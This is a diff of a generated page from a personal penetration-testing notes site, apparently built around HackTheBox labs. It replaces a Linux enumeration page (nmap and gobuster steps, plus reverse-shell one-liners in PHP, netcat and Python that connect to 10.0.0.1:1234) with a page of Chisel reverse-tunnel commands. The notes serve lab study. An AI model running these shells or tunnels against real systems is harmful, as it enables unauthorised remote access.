@@ -5,8 +5,8 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2019-07-21T18:19:20 EDT">
-<title>Linux Enumeration :: Pwny_Sec</title>
+<meta name="revised" content="2019-07-21T18:19:19 EDT">
+<title>ChiselTunnel :: Pwny_Sec</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
 <link href="/css/nucleus.css" rel="stylesheet">
@@ -25,7 +25,7 @@
 
     
   </head>
-  <body data-url="/concepts/linux_enum/">
+  <body data-url="/tools/chisel/">
     
       <header>
   <div class="logo">
@@ -73,12 +73,11 @@
   <aside>
     <ul class="menu">
 <a href="http://chickenpwny.github.io"><img src="/images/meme/home.jpg" alt="Alternate Text" style="width:45%;margin-left:auto;margin-right:auto;border-radius:50%;display:block;" alt="Home" /></a>
-<li data-nav-id="/concepts/" class="dd-item parent haschildren
+<li data-nav-id="/concepts/" class="dd-item haschildren
         ">
     <div>
 
-        <a href="/concepts/">Concept</a>
-        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+        <a href="/concepts/">Concept</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
     </div>
     <ul>
 <li data-nav-id="/concepts/dll/" class="dd-item">
@@ -95,7 +94,7 @@
         </a><i class="fa fa-circle-thin read-icon"></i>
     </div>
 </li>
-<li data-nav-id="/concepts/linux_enum/" class="dd-item active">
+<li data-nav-id="/concepts/linux_enum/" class="dd-item">
     <div>
         <a href="/concepts/linux_enum/">
             Linux Enumeration
@@ -401,11 +400,12 @@
         <a href="/help/">Network Manager Down</a><i class="fa fa-circle-thin read-icon"></i>
     </div>
 </li>
-<li data-nav-id="/tools/" class="dd-item haschildren
+<li data-nav-id="/tools/" class="dd-item parent haschildren
         ">
     <div>
 
-        <a href="/tools/">Tools</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+        <a href="/tools/">Tools</a>
+        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
     </div>
     <ul>
 <li data-nav-id="/tools/bloodhound/" class="dd-item">
@@ -415,7 +415,7 @@
         </a><i class="fa fa-circle-thin read-icon"></i>
     </div>
 </li>
-<li data-nav-id="/tools/chisel/" class="dd-item">
+<li data-nav-id="/tools/chisel/" class="dd-item active">
     <div>
         <a href="/tools/chisel/">
             ChiselTunnel
@@ -563,22 +563,34 @@
         <select onchange="javascript:location.href = this.value;">
           
     <option value="/concepts/" >
-   Concept</option> 
-      <option value="/concepts/dll/" >- DLL-Hijacking</option>
-      <option value="/concepts/file-transfer/" >- File Transfer</option>
-      <option value="/concepts/linux_enum/"  selected>- Linux Enumeration</option>
-    <option value="/concepts/webapppentest/" >
-  - 
-   WebAppPenTests</option>
-      <option value="/concepts/windows_enum/" >- Windows</option>
-      <option value="/concepts/bypass/" >- Windows-Bypass</option>
-  
+   Concept</option>
     <option value="/hackthebox/" >
    HackTheBox</option>
     <option value="/help/" >
    Network Manager Down</option>
     <option value="/tools/" >
-   Tools</option>
+   Tools</option> 
+      <option value="/tools/bloodhound/" >- BloodHound Neo4j</option>
+      <option value="/tools/chisel/"  selected>- ChiselTunnel</option>
+      <option value="/tools/ftp/" >- FTP</option>
+    <option value="/tools/hydra/" >
+  - 
+   Hydra</option>
+      <option value="/tools/nmap/" >- Nmap</option>
+    <option value="/tools/portscanning/" >
+  - 
+   PortScannings</option>
+      <option value="/tools/smb/smb/" >- SMB</option>
+    <option value="/tools/snmpwalk/" >
+  - 
+   SNMPWalk</option>
+    <option value="/tools/webapp/" >
+  - 
+   WebApps</option>
+    <option value="/tools/ssh/" >
+  - 
+   ssh</option>
+  
 
 
 
@@ -601,67 +613,30 @@
       </div>
     
 
-    <h1>Linux Enumeration</h1>
+    <h1>ChiselTunnel</h1>
     
     
     
-    <p>I always start with nmap i use TCP Connect switch, then move to targeted scans. Then i run a full udp scan. While udp is being scanned. I will then move to gobuster, start manual enumeration. Things to look for are input fields of any kind, look for php parameters/actions in the source.</p>
+    <p>Chisel SERVER</p>
 
-<p>nmap</p>
-
-<pre><code>nmap -sT -p- -T5 -oA nmap/tcpconnect ipaddr
-nmap -sC -sV -T4 -pport,port,port -oA nmap/targeted ipaddr
-nmap -sU -p- -T5 -oA nmap/udp ipaddr
+<pre><code>./Chisel server -p 8000 -reverse -v
+-reverse the connection this is important 
+-v verbose
+-p port
 </code></pre>
 
-<p>Gobuster</p>
+<p>Chisel.exe CLIENT</p>
 
-<p>I try to start with the small list first gobuster can be rather slow, and time consuming so it fits in with manual enumeration.</p>
-
-<p>Finding Vulnerabilities.</p>
-
-<pre><code>cmd line : searchsploit name
-Google.com
-https://0xdf.gitlab.io/
-https://www.exploit-db.com/
-https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA
+<pre><code>c.exe client 10.10.15.254:8000 R:127.0.0.1:8001:localhost:8081	
 </code></pre>
-
-<p>Transfer these over to a directory that is writeable &amp; run them.</p>
-
-<p><a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p>
-
-<p>Shells</p>
-
-<p>PHP</p>
-
-<pre><code>php -r '$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'
-</code></pre>
-
-<p>NetCat</p>
-
-<pre><code>nc -e /bin/sh ipaddress 1234
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f
-</code></pre>
-
-<p>Python</p>
-
-<pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
-</code></pre>
-
-<p>cronjob stuff</p>
-
-<p><a href="https://crontab.guru/every-1-minute">https://crontab.guru/every-1-minute</a></p>
-
-<p><a href="https://askubuntu.com/questions/1021622/crontab-doesnt-run-python-script">https://askubuntu.com/questions/1021622/crontab-doesnt-run-python-script</a></p>
 
 
     
     
         <div class="chevrons">
     <div id="navigation">
-<a class="nav nav-prev" href="/concepts/file-transfer/" title="File Transfer"> <i class="fa fa-chevron-left"></i><label>File Transfer</label></a>
-    <a class="nav nav-next" href="/concepts/webapppentest/" title="WebAppPenTests" style="margin-right: 0px;"><label>WebAppPenTests</label><i class="fa fa-chevron-right"></i></a></div>
+<a class="nav nav-prev" href="/tools/bloodhound/" title="BloodHound Neo4j"> <i class="fa fa-chevron-left"></i><label>BloodHound Neo4j</label></a>
+    <a class="nav nav-next" href="/tools/ftp/" title="FTP" style="margin-right: 0px;"><label>FTP</label><i class="fa fa-chevron-right"></i></a></div>
   </div>
 
   </section>
@@ -678,7 +653,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/
 
     
     <div class="github-link">
-      <a href="https://chickenpwny.github.ioConcepts/Linux_Enum.md" target="blank"><i class="fa fa-code-fork"></i>
+      <a href="https://chickenpwny.github.ioTools/chisel.md" target="blank"><i class="fa fa-code-fork"></i>
         Improve this page</a>
     </div>
     
